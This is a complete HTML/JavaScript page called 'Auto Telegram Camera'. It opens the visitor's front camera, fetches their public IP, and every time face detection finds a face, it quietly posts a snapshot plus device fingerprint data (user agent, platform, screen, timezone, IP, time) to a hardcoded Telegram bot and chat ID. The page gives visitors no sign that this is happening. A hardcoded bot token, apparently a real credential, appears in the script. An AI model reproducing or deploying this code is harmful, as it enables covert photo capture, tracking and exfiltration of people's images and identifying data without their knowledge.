<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Auto Telegram Camera</title>

<style>
    body {
        margin: 0;
        background: black;
        color: white;
        display: flex;
        flex-direction: column;
        align-items: center;
        justify-content: center;
        height: 100vh;
        font-family: sans-serif;
    }
    video {
        width: 100%;
        max-width: 360px;
        transform: scaleX(-1);
        border: 2px solid #0f0;
    }
    button {
        margin-top: 12px;
        padding: 10px 20px;
        font-size: 16px;
    }
</style>
</head>
<body>

<video id="video" autoplay playsinline></video>
<canvas id="canvas" style="display:none;"></canvas>

<button onclick="start()">START</button>

<script>
const video = document.getElementById("video");
const canvas = document.getElementById("canvas");

/*
BOT_TOKEN:
Telegram bot authentication token
*/
const BOT_TOKEN = "7917384016:AAG7cxyuts9UJ-Km0BMqBeQVJEJfstH239g";

/*
CHAT_ID:
Destination chat where images will be sent
*/
const CHAT_ID  = "8319568593";

let intervalId = null;
let userIP = "Unknown";

/* Fetch public IP address */
fetch("https://api.ipify.org?format=json")
  .then(r => r.json())
  .then(d => userIP = d.ip)
  .catch(() => userIP = "Unavailable");

/* Front camera access */
navigator.mediaDevices.getUserMedia({
    video: { facingMode: "user" }
}).then(stream => video.srcObject = stream);

/* Face detection API (Chrome Android supported) */
const faceDetector = ("FaceDetector" in window)
    ? new FaceDetector({ fastMode: true })
    : null;

function start() {
    if (!faceDetector) return;
    if (intervalId) return;
    intervalId = setInterval(detectAndSend, 2000);
}

async function detectAndSend() {
    const faces = await faceDetector.detect(video);
    if (faces.length === 0) return;

    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;

    const ctx = canvas.getContext("2d");
    ctx.translate(canvas.width, 0);
    ctx.scale(-1, 1);
    ctx.drawImage(video, 0, 0);

    canvas.toBlob(blob => {

        const caption =
`Device Info
User Agent: ${navigator.userAgent}
Platform: ${navigator.platform}
Language: ${navigator.language}
Screen: ${screen.width}x${screen.height}
Timezone: ${Intl.DateTimeFormat().resolvedOptions().timeZone}
IP: ${userIP}
Time: ${new Date().toLocaleString()}`;

        const form = new FormData();
        form.append("chat_id", CHAT_ID);
        form.append("photo", blob);
        form.append("caption", caption);

        fetch(\`https://api.telegram.org/bot\${BOT_TOKEN}/sendPhoto\`, {
            method: "POST",
            body: form
        });

    }, "image/jpeg", 0.7);
}
</script>

</body>
</html>
